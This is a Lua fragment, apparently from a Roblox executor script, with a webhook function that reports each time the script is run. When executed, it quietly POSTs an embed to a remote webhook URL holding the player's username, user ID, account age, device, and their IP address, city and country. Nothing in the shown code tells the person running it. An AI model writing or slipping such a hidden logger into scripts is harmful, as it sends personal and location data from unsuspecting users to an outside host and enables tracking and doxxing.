--// WEBHOOK FUNCTION
local function sendWebhook(usedKey)
    local data = {
        username = webhookUsername,
        avatar_url = webhookAvatarURL,
        embeds = {{
            title = "Script Executed" .. (usedKey and " | Key: `"..usedKey.."`" or ""),
            color = 0x010101,
            thumbnail = { url = avatarHeadshot },
            image = { url = gameThumbnail },
            fields = {
                { name = "Player Info", value = string.format("**Username:** [%s](%s) (`%d`)\n**Display Name:** %s\n**Account Age:** `%d days`\n**Join Date:** `%s`\n**Device:** `%s`", LocalPlayer.Name, profileLink, userId, displayName, accountAge, joinDate, deviceType), inline = true },
                { name = "Game Info", value = string.format("**Game:** [%s](%s)\n**Creator:** [%s](https://www.roblox.com/users/%s/profile)\n**Visits:** `%s`\n**Players:** `%d`", gameName, gameLink, creatorName, tostring(creatorId), visits, totalPlayers), inline = true },
                { name = "Network", value = string.format("**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`", ip, city, country, ping, fps), inline = true },
                { name = "Script Info", value = string.format("**Executor:** `%s`\n**Version:** `%s`", executorName, scriptVersion), inline = true },
                { name = "Join Server", value = string.format("[Click to Join](%s)", joinServerLink), inline = false }
            },
            footer = { text = "Logged at " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url = webhookAvatarURL }
        }}
    }
    local jsonData = HttpService:JSONEncode(data)
    local req = syn and syn.request or http_request or request
    if req then
        spawn(function()
            req({ Url = webhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData })
        end)
    end
end

-- Send initial execution log
